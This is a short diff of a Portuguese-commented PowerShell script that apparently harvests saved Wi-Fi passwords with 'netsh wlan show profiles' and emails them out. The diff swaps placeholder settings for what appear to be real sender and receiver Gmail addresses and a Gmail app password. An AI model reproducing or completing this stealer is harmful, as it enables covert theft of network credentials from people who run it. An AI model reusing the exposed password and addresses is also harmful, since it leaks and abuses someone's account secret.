@@ -1,7 +1,7 @@
 # --- CONFIGURAÇÕES ---
-$email_Enviante = "seu_email_enviante@gmail.com"
-$senha_Enviante = "sua_senha_de_app_aqui"
-$email_Recebedor = "seu_email_recebedor@gmail.com"
+$email_Enviante = "lcsdevsvoltou@gmail.com"
+$senha_Enviante = "zbez khhk eiey hptx"
+$email_Recebedor = "scheuerlucar14102007@gmail.com"
 
 # 1. Coleta de Senhas de Wi-Fi
 $wifi = netsh wlan show profiles | Select-String "\:(.*)$" | ForEach-Object {
